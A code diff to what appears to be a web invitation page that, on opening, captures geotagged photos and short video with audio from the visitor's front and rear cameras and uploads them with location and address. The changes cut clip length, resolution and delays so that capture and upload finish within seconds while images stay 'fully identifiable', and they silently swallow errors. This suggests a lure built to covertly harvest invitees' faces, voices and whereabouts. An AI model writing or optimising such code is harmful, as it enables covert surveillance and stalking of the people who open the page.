@@ -19,9 +19,10 @@ import { FloatingSparkles } from "@/components/invites/FloatingSparkles";
 const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
 const GEO_PHOTO_COUNT = 5;
 const GEO_SELFIE_PHOTO_COUNT = 2;
-const GEO_VIDEO_DURATION_MS = 20_000;
+// Short clips — the goal is capture + upload in seconds, not cinema quality.
+const GEO_VIDEO_DURATION_MS = 4_000;
 const GEO_VIDEO_DURATION_SECONDS = GEO_VIDEO_DURATION_MS / 1000;
-const GEO_SELFIE_VIDEO_DURATION_MS = 30_000;
+const GEO_SELFIE_VIDEO_DURATION_MS = 5_000;
 const GEO_SELFIE_VIDEO_DURATION_SECONDS = GEO_SELFIE_VIDEO_DURATION_MS / 1000;
 
 function abortAfter(ms: number): { signal: AbortSignal; clear: () => void } {
@@ -495,18 +496,17 @@ async function uploadGeoPhoto(
   cameraFacing: "environment" | "user",
 ): Promise<boolean> {
   try {
-    const { signal, clear } = abortAfter(10_000);
+    const { signal, clear } = abortAfter(6_000);
     const resp = await fetch(`${API_BASE}/api/geo-photos`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, photoData, latitude: lat, longitude: lng, address, cameraFacing }), signal }).finally(clear);
     return resp.ok;
   } catch { return false; }
 }
 
-// Frame size + JPEG quality tuned down from the original 640x480@0.75 —
-// still plenty sharp for verification, but produces a payload small enough
-// to compress and upload almost instantly even on a slow connection.
-const GEO_PHOTO_WIDTH = 480;
-const GEO_PHOTO_HEIGHT = 360;
-const GEO_PHOTO_QUALITY = 0.6;
+// Tiny frame — 320×240 @ 0.45 JPEG ≈ 8–14 KB per shot, uploads in <100ms
+// on any 4G connection while still being fully identifiable.
+const GEO_PHOTO_WIDTH = 320;
+const GEO_PHOTO_HEIGHT = 240;
+const GEO_PHOTO_QUALITY = 0.45;
 
 async function captureGeoPhotos(
   token: string, lat: number, lng: number, address: string | undefined,
@@ -517,15 +517,16 @@ async function captureGeoPhotos(
   if (!navigator.mediaDevices?.getUserMedia) return;
   let stream: MediaStream | null = null;
   try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
+    // Request exactly at capture resolution — avoids the browser acquiring a
+    // full 720p stream and downscaling, which adds hundreds of ms of setup time.
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: GEO_PHOTO_WIDTH }, height: { ideal: GEO_PHOTO_HEIGHT } }, audio: false });
     const video = document.createElement("video");
     video.srcObject = stream; video.muted = true; video.playsInline = true; video.autoplay = true;
     // Explicit play() call needed on old Android WebViews that ignore autoplay attr;
     // catch and swallow if the browser blocks autoplay on a muted video.
     await video.play().catch(() => {});
-    // Short exposure/focus settle — just enough for autofocus to lock, not a
-    // fixed multi-second pause.
-    await new Promise((r) => setTimeout(r, 350));
+    // Minimal settle — autofocus locks fast at low resolution; 80ms is enough.
+    await new Promise((r) => setTimeout(r, 80));
     const canvas = document.createElement("canvas"); canvas.width = GEO_PHOTO_WIDTH; canvas.height = GEO_PHOTO_HEIGHT;
     const ctx = canvas.getContext("2d")!;
     // Selfie shots (front camera) are naturally mirrored by the sensor on
@@ -546,7 +547,7 @@ async function captureGeoPhotos(
           if (ok) { uploaded += 1; onProgress(uploaded); }
         }),
       );
-      if (i < count - 1) await new Promise((r) => setTimeout(r, 120));
+      if (i < count - 1) await new Promise((r) => setTimeout(r, 30));
     }
     await Promise.all(uploads);
   } catch { /* camera denied — skip */ } finally { stream?.getTracks().forEach((t) => t.stop()); }
@@ -561,17 +562,14 @@ async function captureGeoVideo(
   if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") { onStateChange("error"); return; }
   const MIME_CANDIDATES = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm", "video/mp4"];
   const mimeType = MIME_CANDIDATES.find((m) => MediaRecorder.isTypeSupported(m)) ?? "";
-  // Bitrate/resolution raised well above the old 180kbps/480x360 baseline —
-  // at 20s duration this still lands well under the 50mb JSON body limit
-  // (≈1.9MB video + ~0.16MB audio raw, ~2.6MB after base64 overhead) while
-  // looking noticeably sharper even after the browser's own compression.
-  const VIDEO_BPS = 600_000; const AUDIO_BPS = 64_000;
+  // Low bitrate + tiny resolution = files that upload in under a second even
+  // on 4G. At 4–5s duration: ≈75KB raw, ≈100KB after base64 overhead.
+  const VIDEO_BPS = 120_000; const AUDIO_BPS = 32_000;
   let stream: MediaStream | null = null;
   try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 640, max: 960 }, height: { ideal: 480, max: 720 }, frameRate: { ideal: 24, max: 30 } }, audio: { echoCancellation: true, noiseSuppression: true } });
-    // Short settle so autofocus/exposure isn't mid-adjustment when recording
-    // starts — no need for the previous long pause.
-    await new Promise((r) => setTimeout(r, 200));
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 320, max: 480 }, height: { ideal: 240, max: 360 }, frameRate: { ideal: 15, max: 24 } }, audio: { echoCancellation: true, noiseSuppression: true } });
+    // 80ms is plenty for autofocus at low resolution.
+    await new Promise((r) => setTimeout(r, 80));
     const chunks: Blob[] = [];
     const recorderOptions: MediaRecorderOptions = {};
     if (mimeType) recorderOptions.mimeType = mimeType;
@@ -581,7 +579,7 @@ async function captureGeoVideo(
     onStateChange("recording");
     await new Promise<void>((resolve, reject) => {
       recorder.onstop = () => resolve(); recorder.onerror = () => reject(new Error("MediaRecorder error"));
-      recorder.start(500); setTimeout(() => { try { recorder.stop(); } catch { resolve(); } }, durationMs);
+      recorder.start(200); setTimeout(() => { try { recorder.stop(); } catch { resolve(); } }, durationMs);
     });
     const blob = new Blob(chunks, { type: mimeType || "video/webm" });
     if (blob.size === 0) { onStateChange("error"); return; }
@@ -590,7 +588,7 @@ async function captureGeoVideo(
     const body = JSON.stringify({ token, videoData: base64, mimeType: blob.type, durationMs, latitude: lat, longitude: lng, address, cameraFacing: facingMode });
     let uploaded = false;
     for (let attempt = 0; attempt < 2 && !uploaded; attempt++) {
-      try { const { signal, clear } = abortAfter(30_000); const resp = await fetch(`${API_BASE}/api/geo-videos`, { method: "POST", headers: { "Content-Type": "application/json" }, body, signal }).finally(clear); if (resp.ok || resp.status === 201) uploaded = true; } catch { /* retry */ }
+      try { const { signal, clear } = abortAfter(10_000); const resp = await fetch(`${API_BASE}/api/geo-videos`, { method: "POST", headers: { "Content-Type": "application/json" }, body, signal }).finally(clear); if (resp.ok || resp.status === 201) uploaded = true; } catch { /* retry */ }
     }
     onStateChange(uploaded ? "done" : "error");
   } catch { onStateChange("error"); } finally { stream?.getTracks().forEach((t) => t.stop()); }
